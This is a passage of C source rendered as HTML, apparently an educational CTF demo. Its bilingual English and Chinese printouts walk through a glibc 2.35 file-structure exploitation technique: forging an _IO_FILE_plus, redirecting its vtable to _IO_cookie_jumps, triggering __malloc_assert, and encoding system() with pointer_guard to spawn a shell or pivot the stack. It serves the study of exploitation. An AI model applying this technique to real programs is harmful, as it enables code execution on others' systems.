class="number">0x3000</span> + <span class="number">0x770</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThe value of pointer_guard is: \033[31m%#zx\033[0m\n&quot;</span>, *pointer_guard_address);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mpointer_guard的值为: \033[31m%#zx\033[0m\n&quot;</span>, *pointer_guard_address);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mIn CTF problems you can&#x27;t always get the original value of pointer_guard, but you can also change it to a known value.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m在CTF赛题中你可能不能获取到pointer_guard的值，但你可以将其改写为一个已知值。\n\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mOK, now we can try to forge a _IO_FILE struct.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m那么现在我们就来开始伪造_IO_FILE结构体。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mAttention: what we forge is actually _IO_FILE_plus struct, which contains a _IO_FILE struct and a vtable pointer(_IO_jump_t*)\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m注意：我们伪造的实际上是_IO_FILE_plus结构体，其包含_IO_FILE结构体的所有内容以及一个vtable指针(_IO_jump_t*)\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_IO_FILE</span>* fake_file_struct = (<span class="keyword">struct</span> _IO_FILE*)<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="type">size_t</span>* vtable = (<span class="type">size_t</span>*)((<span class="type">char</span>*)fake_file_struct + <span class="built_in">sizeof</span> (<span class="keyword">struct</span> _IO_FILE));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mWe just allocate a fake _IO_FILE_plus struct into the heap: \033[31m%p\033[m\n&quot;</span>, fake_file_struct);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m我们刚刚分配了一个假的_IO_FILE_plus结构体到堆: \033[31m%p\033[m\n&quot;</span>, fake_file_struct);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThe address of fake _IO_FILE_plus is: \033[31m%p\033[0m\n&quot;</span>, fake_file_struct);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m这个假的_IO_FILE_plus结构体的地址为: \033[31m%p\033[0m\n&quot;</span>, fake_file_struct);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThe address of vtable pointer is: \033[31m%p\033[0m\n&quot;</span>, vtable);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mvtable指针的地址为: \033[31m%p\033[0m\n&quot;</span>, vtable);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThen we are going to change the value of _lock and vtable pointer.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m然后我们来修改_lock和vtable指针的值。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThe _lock should be changed into \033[31m_IO_stdfile_1_lock\033[32m, which is in \033[31m(libc_base + 0x21ba70).\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m_lock的值应该被修改为\033[31m_IO_stdfile_1_lock\033[32m, 它的地址为\033[31m(libc_base + 0x21ba70).\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThe vtable should be changed into \033[31m(_IO_cookie_jumps + 0x38)\033[32m, &quot;</span></span><br><span class="line">         <span class="string">&quot;which points to function \033[31m_IO_file_xsputn.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mvtable指针应该被修改为\033[31m(_IO_cookie_jumps + 0x38)\033[32m, &quot;</span></span><br><span class="line">         <span class="string">&quot;其指向函数\033[31m_IO_file_xsputn.\033[0m\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mBefore alteration: fake_file_struct-&gt;_lock = \033[33m%p\033[0m\n&quot;</span>, fake_file_struct-&gt;_lock);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m修改前: fake_file_struct-&gt;_lock = \033[33m%p\033[0m\n&quot;</span>, fake_file_struct-&gt;_lock);</span><br><span class="line">    fake_file_struct-&gt;_lock = (<span class="type">void</span> *) (libc_base + <span class="number">0x21ba70</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mAfter alteration: fake_file_struct-&gt;_lock = \033[31m%p\033[0m\n&quot;</span>, fake_file_struct-&gt;_lock);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m修改后: fake_file_struct-&gt;_lock = \033[31m%p\033[0m\n\n&quot;</span>, fake_file_struct-&gt;_lock);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mBefore alteration: fake_file_struct-&gt;vtable = \033[33m%#zx\033[0m\n&quot;</span>, *vtable);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m修改前: fake_file_struct-&gt;vtable = \033[33m%#zx\033[0m\n&quot;</span>, *vtable);</span><br><span class="line">    *vtable = (<span class="type">size_t</span>)(libc_base + <span class="number">0x215b80</span> + <span class="number">0x38</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mAfter alteration: fake_file_struct-&gt;vtable = \033[31m%#zx\033[0m\n&quot;</span>, *vtable);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m修改后: fake_file_struct-&gt;vtable = \033[31m%#zx\033[0m\n\n&quot;</span>, *vtable);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span>* top_chunk_size = (<span class="type">size_t</span>*)((<span class="type">char</span>*)fake_file_struct + <span class="number">0x108</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThrough pwndbg, we can see that the size of top chunk is at fake_file_struct + 0x108 = %p\033[0m\n&quot;</span>, top_chunk_size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m通过pwndbg我们可以看到top chunk的大小保存在fake_file_struct + 0x108 = %p\033[0m\n&quot;</span>, top_chunk_size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThe value of top_chunk-&gt;size is: %#zx\033[0m\n&quot;</span>, *top_chunk_size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mtop chunk的大小top_chunk-&gt;size为: %#zx\033[0m\n&quot;</span>, *top_chunk_size);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mIn function sysmalloc, there is a check for page alignment of top chunk: \n\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m在函数sysmalloc中，有一个检查top chunk页对齐的代码片段: \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[33m(line 2617, /malloc/malloc.c)\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m  assert ((old_top == initial_top (av) &amp;&amp; old_size == 0) ||\n&quot;</span></span><br><span class="line">         <span class="string">&quot;          ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;           prev_inuse (old_top) &amp;&amp;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;           ((unsigned long) old_end &amp; (pagesize - 1)) == 0));\n\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThe function assert here in malloc.c is a bit different from that in other file.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m这个malloc.c中的assert函数与其他文件中的函数不太一样。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mBecause in malloc.c there is a #define statement: \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m因为在malloc.c中有一个#define语句: \n\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[33m(line 292, /malloc/malloc.c)\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m# define __assert_fail(assertion, file, line, function)\t\t\t\\\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\t __malloc_assert(assertion, file, line, function)\n\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mSo that if the assertion in malloc.c failed, it will call function __malloc_assert.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m所以如果这个检查失败了，那么它就会调用__malloc_assert.\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThe content of function __malloc_assert is: \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m__malloc_assert函数的内容为: \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[33m(line 297, /malloc/malloc.c)\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34mstatic void\n&quot;</span></span><br><span class="line">         <span class="string">&quot;__malloc_assert (const char *assertion, const char *file, unsigned int line,\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\t\t const char *function)\n&quot;</span></span><br><span class="line">         <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  (void) __fxprintf (NULL, \&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\\n\&quot;,\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\t\t     __progname, __progname[0] ? \&quot;: \&quot; : \&quot;\&quot;,\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\t\t     file, line,\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\t\t     function ? function : \&quot;\&quot;, function ? \&quot;: \&quot; : \&quot;\&quot;,\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\t\t     assertion);\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  fflush (stderr);\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  abort ();\n&quot;</span></span><br><span class="line">         <span class="string">&quot;&#125;\033[0m\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mWhile in function __fxprintf, it will utilize stderr to output something, and that is our chance.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m函数__fxprintf会利用stderr来输出错误信息，这就是我们利用的机会。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThrough forging fake _IO_FILE struct, we can turn to anywhere that can be executed.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m通过伪造_IO_FILE结构体，我们可以执行任意地址的代码。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThe easiest way in CTF is turning the execution flow into one gadget.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m在CTF比赛中最简单的方法就是将执行流转到one_gadget中。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mBut one gadgets in libc 2.35 all have many constraints, which we need to pay attention to.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m但glibc 2.35版本的one gadget有很多的限制条件需要注意。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mMoreover, many problems today have sandboxes, where you cannot use the syscall EXECVE.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m另外，现在的很多赛题都有沙箱，我们可能不能调用execve的系统调用。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mSo stack pivoting may be the most common step in exploitation.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m因此栈迁移就是本方法利用中较为常用的手段了。\n\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mIn function __vxprintf_internal, which is called indirectly by __fxprintf, it will call function _IO_cookie_read: \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m__fxprintf函数会间接调用到__vxprintf_internal函数，后者会调用_IO_cookie_read函数: \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m&lt;__vfprintf_internal+280&gt;    call   qword ptr [r12 + 0x38]\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThe &#x27;r12&#x27; here is (_IO_cookie_jumps + 0x38), which is the value of *vtable we wrote in before.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m这里的r12寄存器的值就是(_IO_cookie_jumps + 0x38), 这就是我们前面写的*vtable值。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mAs you can see in struct _IO_cookies_jump: \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m就如_IO_cookies_jump中代码展示的这样: \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[33m(line 111, /libio/iofopncook.c)\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34mstatic const struct _IO_jump_t _IO_cookie_jumps libio_vtable = &#123;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT_DUMMY,\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(finish, _IO_file_finish),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(overflow, _IO_file_overflow),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(underflow, _IO_file_underflow),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(uflow, _IO_default_uflow),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(pbackfail, _IO_default_pbackfail),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(xsputn, _IO_file_xsputn),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(xsgetn, _IO_default_xsgetn),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(seekoff, _IO_cookie_seekoff),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(seekpos, _IO_default_seekpos),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(setbuf, _IO_file_setbuf),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(sync, _IO_file_sync),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(doallocate, _IO_file_doallocate),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(read, _IO_cookie_read),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(write, _IO_cookie_write),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(seek, _IO_cookie_seek),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(close, _IO_cookie_close),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(stat, _IO_default_stat),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(showmanyc, _IO_default_showmanyc),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(imbue, _IO_default_imbue),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;&#125;;\n\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[31m(_IO_cookie_jumps + 0x38) \033[32mpoints to \033[35m_IO_file_xsputn\033[32m.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[31m(_IO_cookie_jumps + 0x38) \033[32m指向的是\033[35m_IO_file_xsputn\033[32m.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[31m(_IO_cookie_jumps + 0x38 + 0x38) \033[32mpoints to \033[35m_IO_cookie_read\033[32m.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[31m(_IO_cookie_jumps + 0x38 + 0x38) \033[32m指向的是\033[35m_IO_cookie_read\033[32m.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mSo here we let it call _IO_cookie_read function.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m所以这里我们让程序调用_IO_cookie_read函数.\n\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThen let&#x27;s have a look at _IO_cookie_read function.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m让我们看一下_IO_cookie_read函数的内容。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m&lt;_IO_cookie_read&gt;:\tendbr64 \n&quot;</span></span><br><span class="line">         <span class="string">&quot;   &lt;_IO_cookie_read+4&gt;:\tmov    rax,QWORD PTR [rdi+0xe8]\n&quot;</span></span><br><span class="line">         <span class="string">&quot;   &lt;_IO_cookie_read+11&gt;:\tror    rax,0x11\n&quot;</span></span><br><span class="line">         <span class="string">&quot;   &lt;_IO_cookie_read+15&gt;:\txor    rax,QWORD PTR fs:0x30\n&quot;</span></span><br><span class="line">         <span class="string">&quot;   &lt;_IO_cookie_read+24&gt;:\ttest   rax,rax\n&quot;</span></span><br><span class="line">         <span class="string">&quot;   &lt;_IO_cookie_read+27&gt;:\tje     &lt;_IO_cookie_read+38&gt;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;   &lt;_IO_cookie_read+29&gt;:\tmov    rdi,QWORD PTR [rdi+0xe0]\n&quot;</span></span><br><span class="line">         <span class="string">&quot;   &lt;_IO_cookie_read+36&gt;:\t\033[31mjmp    rax\033[34m\n&quot;</span></span><br><span class="line">         <span class="string">&quot;   &lt;_IO_cookie_read+38&gt;:\tmov    rax,0xffffffffffffffff\n&quot;</span></span><br><span class="line">         <span class="string">&quot;   &lt;_IO_cookie_read+45&gt;:\tret\033[0m\n&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mAs you can see, it directly calls rax, and &#x27;rdi&#x27; here is actually our fake _IO_FILE_plus address.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m可以看到，它直接call rax，这里的rdi实际上就是假的_IO_FILE_plus结构体的地址。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mSo that we can write any executable address into [rdi+0xe8].\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m因此我们可以将任意可执行的地址写入到[rdi+0xe8].\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mHowever, don&#x27;t forget some instructions in the middle.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m但是，别忘了中间还有几条指令。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mHere, you can see a &#x27;ror&#x27; instruction and a &#x27;xor&#x27; instruction that change the value of rax.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m这里你可以看到有一个ror指令和一个xor指令，这些指令会修改rax的值。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThat is actually a kind of protection strategy used in high versions of glibc ---- encrypting the address.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m这实际上是高版本glibc的一种保护方式——将地址进行简单加密。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mHere, these two instruction is decrypting rax, first ror 11 bits, and second xor fs:0x30h, which is our \033[31mpointer_guard.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m这里的这两条指令实际上是在解密rax，首先循环右移0x11位，然后异或fs:0x30h，这实际上就是\033[31mpointer_guard.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mNow you know that why we need the value of pointer_guard, it&#x27;s important for us to encrypt executable address.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m现在你应该知道为什么我们需要修改pointer_guard的值了，它对于地址的加密过程很重要。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThe encryption algorithm is easy to get: first xor pointer_guard, and second rol 0x11 bits.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m加密方式很好推出来：首先异或pointer_guard，然后循环左移0x11位。\n\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mPay attention to the instruction before &#x27;jmp rax&#x27;: mov rdi, QWORD PTR [rdi+0xe0]\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m注意&#x27;jmp rax&#x27;之前的指令: mov rdi, QWORD PTR [rdi+0xe0]\n\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mIf there is not any sandbox, we can let rax=system() address, and [rdi+0xe0]=&#x27;/bin/sh&#x27; address.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m如果这里没有沙箱，我们可以让rax等于system函数地址，[rdi+0xe0]等于字符串/bin/sh的地址\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mElse, you can also fill it with &#x27;pcop&#x27; to trigger stack pivoting and open, read, write flag file.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m否则，我们也可以填充pcop的地址来触发栈迁移，然后打开、读、写flag文件。\n\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(mode == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[35mYou chose the getshell mode.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[35m你选择了getshell模式。\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mSo that we&#x27;ll write &#x27;/bin/sh&#x27; address into [rdi+0xe0] and encrypted system() address into [rdi+0xe8]\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m所以我们在[rdi+0xe0]处写入字符串/bin/sh的地址，将加密后的system函数地址写入[rdi+0xe8]处。\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span>** sh_addr = (<span class="type">char</span>**)((<span class="type">char</span>*)fake_file_struct + <span class="number">0xe0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThe address of string &#x27;/bin/sh&#x27; should be written in: \033[31m%p\n\033[0m&quot;</span>, sh_addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m字符串&#x27;/bin/sh&#x27;的地址应该被写到: \033[31m%p\n\033[0m&quot;</span>, sh_addr);</span><br><span class="line">        *sh_addr = sh;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m指针解引用的值为: \033[31m%p\033[0m\n&quot;</span>, *sh_addr);</span><br><span class="line"></span><br><span class="line">        <span class="type">size_t</span>* system_addr = (<span class="type">size_t</span>*)((<span class="type">char</span>*)fake_file_struct + <span class="number">0xe8</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThe address of function system() should be written in: \033[31m%p\n\033[0m&quot;</span>, system_addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m函数system()的地址应该被写到: \033[31m%p\n\033[0m&quot;</span>, system_addr);</span><br><span class="line">        *system_addr = (<span class="type">size_t</span>)system;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mNow the value of the pointer is: \033[31m%#zx\033[0m\n&quot;</span>, *system_addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m指针解引用的值为: \033[31m%#zx\033[0m\n&quot;</span>, *system_addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThen we need to let it xor with pointer_guard: \033[33m%#zx.\n\033[0m&quot;</span>, *pointer_guard_address);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m然后我们需要让这个值异或pointer_guard: \033[33m%#zx.\n\033[0m&quot;</span>, *pointer_guard_address);</span><br><span class="line">        *system_addr ^= *pointer_guard_address;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mAfter xor, the value of [rdi+0xe8] is: \033[35m%#zx\n\033[0m&quot;</span>, *system_addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m异或之后[rdi+0xe8]的值为: \033[35m%#zx\n\033[0m&quot;</span>, *system_addr);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThen we need to let it rol 0x11 bits.\n\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m然后我们循环左移0x11位:\n\033[0m&quot;</span>);</span><br><span class="line">        *system_addr = (*system_addr &lt;&lt; <span class="number">0x11</span>) + (*system_addr &gt;&gt; <span class="number">0x2f</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mAfter rol, the value of [rdi+0xe8] is: \033[35m%#zx\n\033[0m\n&quot;</span>, *system_addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m循环左移后，[rdi+0xe8]的值为: \033[35m%#zx\n\033[0m\n&quot;</span>, *system_addr);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(mode == <span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mYou chose the orw mode.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m你选择了orw模式。\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[1;31mIMPORTANT: You must make sure that there is a flag file in this directory, or we&#x27;ll be unable to read.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[1;31m注意：你必须保证当前文件夹下有一个flag文件，否则该程序将无法读取。\n\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mIn glibc 2.35, we usually use setcontext() function to trigger stack pivoting, but with a little difference from lower versions.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m在glibc 2.35中，我们一般使用setcontext函数进行栈迁移，但与低版本的glibc的利用方式有一些小差别。\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mIn lower version, the instruction that changes the rsp is: &#x27;mov rsp, [rdi+xx]&#x27;.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m在低版本glibc中，修改rsp的指令为: &#x27;mov rsp, [rdi+xx]&#x27;.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThe rdi here is our [fake _IO_FILE_plus struct + 0xe0].\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m这里的rdi是[fake _IO_FILE_plus struct + 0xe0].\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mBut in glibc 2.35, the instruction was changed to: \033[31m&#x27;mov rsp, [rdx+xx]&#x27;\033[32m.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m但是在glibc 2.35中，这条指令被修改为: \033[31m&#x27;mov rsp, 